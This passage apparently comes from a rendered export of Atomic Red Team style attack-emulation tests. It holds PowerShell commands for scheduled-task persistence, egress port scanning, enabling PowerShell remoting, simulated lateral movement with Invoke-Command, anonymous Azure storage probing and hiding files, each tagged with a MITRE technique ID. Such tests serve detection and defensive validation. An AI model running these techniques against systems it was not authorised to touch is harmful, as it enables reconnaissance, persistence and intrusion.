<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: dda6fc7b-c9a6-4c18-b98d-95ec6542af6d</li>
<li><strong>name</strong>: PowerShell Modify A Scheduled Task</li>
<li><strong>description</strong>: Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. 
It will first be created to spawn cmd.exe, but modified to run notepad.exe.</li>
</ul>
<p>Upon successful execution, powershell.exe will create a scheduled task and modify the action. </p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $Action = New-ScheduledTaskAction -Execute "cmd.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTaskModifed -InputObject $object
$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false &gt;$null 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1053.005</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 4b467538-f102-491d-ace7-ed487b853bf5</li>
<li><strong>name</strong>: List Open Egress Ports</li>
<li><strong>description</strong>: This is to test for what ports are open outbound.  The technique used was taken from the following blog:
https://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/</li>
</ul>
<p>Upon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\open-ports.txt.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $ports = Get-content "#{port_file}"
$file = "#{output_file}"
$totalopen = 0
$totalports = 0
New-Item $file -Force
foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect("allports.exposed", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = "$port open" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = "$port closed" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = "There were a total of $totalopen open ports out of $totalports ports tested."
$results | Out-File -Encoding ASCII -append $file
Write-Host $results</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{port_file}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{port_file}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "#{portfile_url}" -OutFile "#{port_file}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item -ErrorAction ignore "#{output_file}"</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1016</p>
</li>
<li><strong>input_arguments.output_file</strong>: {'description': 'Path of file to write port scan results', 'type': 'path', 'default': '$env:USERPROFILE\Desktop\open-ports.txt'}</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 9059e8de-3d7d-4954-a322-46161880b9cf</li>
<li><strong>name</strong>: Enable Windows Remote Management</li>
<li><strong>description</strong>: Powershell Enable WinRM</li>
</ul>
<p>Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Enable-PSRemoting -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1021.006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 5295bd61-bd7e-4744-9d52-85962a4cf2d6</li>
<li><strong>name</strong>: Remote Code Execution with PS Credentials Using Invoke-Command</li>
<li>
<p><strong>description</strong>: Simulate lateral movement with PowerShell Remoting on the local host. 
Upon successful execution, PowerShell will execute <code>whoami</code> using <code>Invoke-Command</code>, targeting the 
local machine as remote target.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: Enable-PSRemoting -Force
Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: Disable-PSRemoting -Force</li>
<li><strong>mitre_id</strong>: T1021.006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 146af1f1-b74e-4aa7-9895-505eb559b4b0</li>
<li><strong>name</strong>: Azure - Scan for Anonymous Access to Azure Storage (Powershell)</li>
<li>
<p><strong>description</strong>: Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. 
The corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. 
See https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     </p>
</li>
<li>
<p><strong>platforms</strong>: ['iaas:azure']</p>
</li>
<li>
<p><strong>command</strong>: try{$response = invoke-webrequest "https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}" -method "GET"}
catch [system.net.webexception]
{if($<em>.Exception.Response -ne $null)
{$Response = $</em>.Exception.Response.GetResponseStream()
$ReadResponse = New-Object System.IO.StreamReader($Response)
$ReadResponse.BaseStream.Position = 0
$responseBody = $ReadResponse.ReadToEnd()}
else {$responseBody = "The storage account could not be anonymously accessed."}}
"Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody" | out-file -filepath #{output_file} -append</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: remove-item #{output_file} -erroraction silentlycontinue</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1530</p>
</li>
<li><strong>input_arguments.output_file</strong>: {'description': 'File to output results to', 'type': 'string', 'default': '$env:temp\T1530Test2.txt'}</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7f66d539-4fbe-4cfa-9a56-4a2bf660c58a</li>
<li><strong>name</strong>: Create Windows Hidden File with powershell</li>
<li>
<p><strong>description</strong>: Creates a file and marks it as hidden through powershell. Upon execution, open File Epxplorer and enable View &gt; Hidden Items. Then, open Properties &gt; Details on the file
and observe that the Attributes is "H" Hidden.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $file = Get-Item $env:temp\T1564.001-9.txt -Force
$file.attributes='Hidden'</p>
</li>
<li>
<p><strong>prereq_command</strong>: IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: echo system_Attrib_T1564.001-9 &gt;&gt; #{file_to_modify}</p>
</li>
<li>
<p><strong>cleanup_command</strong>: cmd /c 'del /A:H #{file_to_modify} &gt;nul 2&gt;&amp;1'</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1564.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: d380c318-0b34-45cb-9dad-828c11891e43</li>
<li><strong>name</strong>: Create Windows System File with powershell</li>
<li>
<p><strong>description</strong>: Creates a file and marks it as System through powershell. Upon execution, open File Epxplorer and enable View &gt; Hidden Items. Then, open Properties &gt; Details on the file
and observe that the Attributes is "S" System.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $file = Get-Item $env:temp\T1564.001-10.txt -Force
$file.attributes='System'</p>
</li>
<li>
<p><strong>prereq_command</strong>: IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: echo system_Attrib_T1564.001-10 &gt;&gt; #{file_to_modify}</p>
</li>
<li>
<p><strong>cleanup_command</strong>: cmd /c 'del /A:H #{file_to_modify} &gt;nul 2&gt;&amp;1'</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1564.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
